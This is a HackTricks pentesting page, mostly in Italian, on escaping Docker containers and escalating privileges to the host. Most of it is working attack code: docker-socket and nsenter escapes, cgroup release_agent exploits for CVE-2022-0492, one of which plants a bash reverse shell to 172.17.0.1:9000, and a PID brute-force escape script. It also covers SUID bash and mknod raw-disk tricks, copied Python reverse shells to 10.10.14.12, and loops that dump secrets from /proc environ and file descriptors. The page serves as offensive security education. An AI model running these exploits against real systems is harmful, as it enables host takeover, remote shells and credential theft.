# Docker Breakout / Privilege Escalation

{{#include ../../../../banners/hacktricks-training.md}}

## Enumerazione Automatica & Fuga

- [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Può anche **enumerare i container**
- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Questo strumento è piuttosto **utile per enumerare il container in cui ti trovi e persino provare a fuggire automaticamente**
- [**amicontained**](https://github.com/genuinetools/amicontained): Strumento utile per ottenere i privilegi che il container ha per trovare modi per fuggire da esso
- [**deepce**](https://github.com/stealthcopter/deepce): Strumento per enumerare e fuggire dai container
- [**grype**](https://github.com/anchore/grype): Ottieni le CVE contenute nel software installato nell'immagine

## Fuga dal Socket Docker Montato

Se in qualche modo scopri che il **socket docker è montato** all'interno del container docker, sarai in grado di fuggire da esso.\
Questo di solito accade nei container docker che per qualche motivo devono connettersi al demone docker per eseguire azioni.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
In questo caso puoi utilizzare i comandi docker regolari per comunicare con il demone docker:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
> [!NOTE]
> Nel caso in cui il **docker socket si trovi in un luogo inaspettato**, puoi comunque comunicare con esso utilizzando il comando **`docker`** con il parametro **`-H unix:///path/to/docker.sock`**

Il daemon Docker potrebbe anche [ascoltare su una porta (di default 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) o su sistemi basati su Systemd, la comunicazione con il daemon Docker può avvenire tramite il socket Systemd `fd://`.

> [!NOTE]
> Inoltre, presta attenzione ai socket di runtime di altri runtime di alto livello:
>
> - dockershim: `unix:///var/run/dockershim.sock`
> - containerd: `unix:///run/containerd/containerd.sock`
> - cri-o: `unix:///var/run/crio/crio.sock`
> - frakti: `unix:///var/run/frakti.sock`
> - rktlet: `unix:///var/run/rktlet.sock`
> - ...

## Abuso delle Capacità per l'Evasione

Dovresti controllare le capacità del container, se ha alcune delle seguenti, potresti essere in grado di evadere da esso: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Puoi controllare le capacità attuali del container utilizzando **strumenti automatici precedentemente menzionati** o:
```bash
capsh --print
```
Nella seguente pagina puoi **scoprire di più sulle capacità di linux** e come abusarne per sfuggire/escale i privilegi:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Fuga da Contenitori Privilegiati

Un contenitore privilegiato può essere creato con il flag `--privileged` o disabilitando specifiche difese:

- `--cap-add=ALL`
- `--security-opt apparmor=unconfined`
- `--security-opt seccomp=unconfined`
- `--security-opt label:disable`
- `--pid=host`
- `--userns=host`
- `--uts=host`
- `--cgroupns=host`
- `Mount /dev`

Il flag `--privileged` riduce significativamente la sicurezza del contenitore, offrendo **accesso illimitato ai dispositivi** e bypassando **diverse protezioni**. Per una spiegazione dettagliata, fai riferimento alla documentazione sugli impatti completi di `--privileged`.

{{#ref}}
../docker-privileged.md
{{#endref}}

### Privilegiato + hostPID

Con questi permessi puoi semplicemente **spostarti nello spazio dei nomi di un processo in esecuzione nel host come root** come init (pid:1) eseguendo semplicemente: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Testalo in un contenitore eseguendo:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Privilegiato

Solo con il flag privilegiato puoi provare ad **accedere al disco dell'host** o provare a **fuggire abusando di release_agent o altri escape**.

Testa i seguenti bypass in un container eseguendo:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Montaggio Disco - Poc1

Container docker ben configurati non permetteranno comandi come **fdisk -l**. Tuttavia, su comandi docker mal configurati dove è specificato il flag `--privileged` o `--device=/dev/sda1` con maiuscole, è possibile ottenere i privilegi per vedere l'unità host.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Quindi, per prendere il controllo della macchina host, è banale:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
E voilà! Ora puoi accedere al filesystem dell'host perché è montato nella cartella `/mnt/hola`.

#### Montaggio Disco - Poc2

All'interno del container, un attaccante può tentare di ottenere ulteriore accesso al sistema operativo host sottostante tramite un volume hostPath scrivibile creato dal cluster. Di seguito ci sono alcune cose comuni che puoi controllare all'interno del container per vedere se puoi sfruttare questo vettore di attacco:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Privileged Escape Abusare dell'esistente release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
```bash:Initial PoC
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### Privileged Escape Abusing created release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
```bash:Second PoC
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
Trova una **spiegazione della tecnica** in:

{{#ref}}
docker-release_agent-cgroups-escape.md
{{#endref}}

#### Privileged Escape Abusing release_agent senza conoscere il percorso relativo - PoC3

Negli exploit precedenti, il **percorso assoluto del container all'interno del filesystem dell'host è rivelato**. Tuttavia, questo non è sempre il caso. Nei casi in cui **non conosci il percorso assoluto del container all'interno dell'host**, puoi utilizzare questa tecnica:

{{#ref}}
release_agent-exploit-relative-paths-to-pids.md
{{#endref}}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Eseguire il PoC all'interno di un contenitore privilegiato dovrebbe fornire un output simile a:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Privileged Escape Abusing Sensitive Mounts

Ci sono diversi file che potrebbero essere montati che forniscono **informazioni sull'host sottostante**. Alcuni di essi potrebbero persino indicare **qualcosa da eseguire da parte dell'host quando accade qualcosa** (il che consentirà a un attaccante di uscire dal container).\
L'abuso di questi file potrebbe consentire:

- release_agent (già trattato in precedenza)
- [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
- [core_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
- [uevent_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
- [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Tuttavia, puoi trovare **altri file sensibili** da controllare in questa pagina:

{{#ref}}
sensitive-mounts.md
{{#endref}}

### Arbitrary Mounts

In diverse occasioni scoprirai che il **container ha qualche volume montato dall'host**. Se questo volume non è stato configurato correttamente, potresti essere in grado di **accedere/modificare dati sensibili**: leggere segreti, cambiare ssh authorized_keys…
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Privilege Escalation con 2 shell e mount dell'host

Se hai accesso come **root all'interno di un container** che ha una cartella dell'host montata e hai **escapato come utente non privilegiato nell'host** e hai accesso in lettura sulla cartella montata.\
Puoi creare un **file bash suid** nella **cartella montata** all'interno del **container** e **eseguirlo dall'host** per privesc.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Privilege Escalation con 2 shell

Se hai accesso come **root all'interno di un container** e sei **uscito come utente non privilegiato nell'host**, puoi abusare di entrambe le shell per **privesc all'interno dell'host** se hai la capacità MKNOD all'interno del container (è di default) come [**spiegato in questo post**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Con tale capacità, l'utente root all'interno del container è autorizzato a **creare file di dispositivo a blocchi**. I file di dispositivo sono file speciali utilizzati per **accedere all'hardware sottostante e ai moduli del kernel**. Ad esempio, il file di dispositivo a blocchi /dev/sda consente di **leggere i dati grezzi sul disco del sistema**.

Docker protegge contro l'uso improprio dei dispositivi a blocchi all'interno dei container imponendo una politica cgroup che **blocca le operazioni di lettura/scrittura sui dispositivi a blocchi**. Tuttavia, se un dispositivo a blocchi viene **creato all'interno del container**, diventa accessibile dall'esterno del container tramite la directory **/proc/PID/root/**. Questo accesso richiede che **il proprietario del processo sia lo stesso** sia all'interno che all'esterno del container.

Esempio di **sfruttamento** da questo [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Se puoi accedere ai processi dell'host, sarai in grado di accedere a molte informazioni sensibili memorizzate in quei processi. Esegui il laboratorio di test:
```
docker run --rm -it --pid=host ubuntu bash
```
Ad esempio, sarai in grado di elencare i processi utilizzando qualcosa come `ps auxn` e cercare dettagli sensibili nei comandi.

Poi, poiché puoi **accedere a ciascun processo dell'host in /proc/ puoi semplicemente rubare i loro segreti ambientali** eseguendo:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Puoi anche **accedere ai descrittori di file di altri processi e leggere i loro file aperti**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Puoi anche **terminare processi e causare un DoS**.

> [!WARNING]
> Se in qualche modo hai **accesso privilegiato su un processo al di fuori del container**, potresti eseguire qualcosa come `nsenter --target <pid> --all` o `nsenter --target <pid> --mount --net --pid --cgroup` per **eseguire una shell con le stesse restrizioni ns** (si spera nessuna) **di quel processo.**

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Se un container è stato configurato con il Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), lo stack di rete di quel container non è isolato dal host Docker (il container condivide lo spazio dei nomi di rete dell'host) e il container non riceve un proprio indirizzo IP. In altre parole, il **container lega tutti i servizi direttamente all'IP dell'host**. Inoltre, il container può **intercettare TUTTO il traffico di rete che l'host** sta inviando e ricevendo sull'interfaccia condivisa `tcpdump -i eth0`.

Ad esempio, puoi usare questo per **sniffare e persino spoofare il traffico** tra l'host e l'istanza di metadata.

Come nei seguenti esempi:

- [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
- [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata_MITM_root_EKS_GKE/)

Sarai anche in grado di accedere ai **servizi di rete legati a localhost** all'interno dell'host o persino accedere alle **permissive di metadata del nodo** (che potrebbero essere diverse da quelle a cui un container può accedere).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
Con `hostIPC=true`, ottieni accesso alle risorse di comunicazione inter-processo (IPC) dell'host, come **memoria condivisa** in `/dev/shm`. Questo consente di leggere/scrivere dove le stesse risorse IPC sono utilizzate da altri processi dell'host o del pod. Usa `ipcs` per ispezionare ulteriormente questi meccanismi IPC.

- **Ispeziona /dev/shm** - Cerca eventuali file in questa posizione di memoria condivisa: `ls -la /dev/shm`
- **Ispeziona le strutture IPC esistenti** – Puoi controllare se ci sono strutture IPC in uso con `/usr/bin/ipcs`. Controllalo con: `ipcs -a`

### Recupera capacità

Se la syscall **`unshare`** non è vietata, puoi recuperare tutte le capacità eseguendo:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Abuso del namespace utente tramite symlink

La seconda tecnica spiegata nel post [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) indica come puoi abusare dei bind mounts con i namespace utente, per influenzare i file all'interno dell'host (in quel caso specifico, eliminare file).

## CVE

### Exploit Runc (CVE-2019-5736)

Nel caso tu possa eseguire `docker exec` come root (probabilmente con sudo), prova a elevare i privilegi fuggendo da un container abusando di CVE-2019-5736 (exploit [qui](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Questa tecnica **sovrascriverà** il binario _**/bin/sh**_ dell'**host** **da un container**, quindi chiunque esegua docker exec può attivare il payload.

Modifica il payload di conseguenza e costruisci il main.go con `go build main.go`. Il binario risultante dovrebbe essere posizionato nel container docker per l'esecuzione.\
All'esecuzione, non appena visualizza `[+] Overwritten /bin/sh successfully` devi eseguire il seguente comando dalla macchina host:

`docker exec -it <container-name> /bin/sh`

Questo attiverà il payload presente nel file main.go.

Per ulteriori informazioni: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

> [!NOTE]
> Ci sono altre CVE a cui il container può essere vulnerabile, puoi trovare un elenco in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)

## Docker Custom Escape

### Superficie di fuga Docker

- **Namespaces:** Il processo dovrebbe essere **completamente separato da altri processi** tramite namespaces, quindi non possiamo fuggire interagendo con altri procs a causa dei namespaces (per impostazione predefinita non possono comunicare tramite IPC, socket unix, servizi di rete, D-Bus, `/proc` di altri procs).
- **Utente root**: Per impostazione predefinita, l'utente che esegue il processo è l'utente root (tuttavia i suoi privilegi sono limitati).
- **Capabilities**: Docker lascia le seguenti capabilities: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
- **Syscalls**: Questi sono i syscalls che l'**utente root non sarà in grado di chiamare** (a causa della mancanza di capabilities + Seccomp). Gli altri syscalls potrebbero essere utilizzati per cercare di fuggire.

{{#tabs}}
{{#tab name="x64 syscalls"}}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{{#endtab}}

{{#tab name="arm64 syscalls"}}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{{#endtab}}

{{#tab name="syscall_bf.c"}}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````

{{#endtab}}
{{#endtabs}}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

- Find the **path of the containers filesystem** inside the host
- You can do this via **mount**, or via **brute-force PIDs** as explained in the second release_agent exploit
- Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
- You should be able to **execute the trigger from inside the host**
- You need to know where the containers files are located inside the host to indicate a script you write inside the host
- Have **enough capabilities and disabled protections** to be able to abuse that functionality
- You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

- [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/_fel1x/status/1151487053370187776?lang=en-GB)
- [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
- [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
- [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

{{#include ../../../../banners/hacktricks-training.md}}
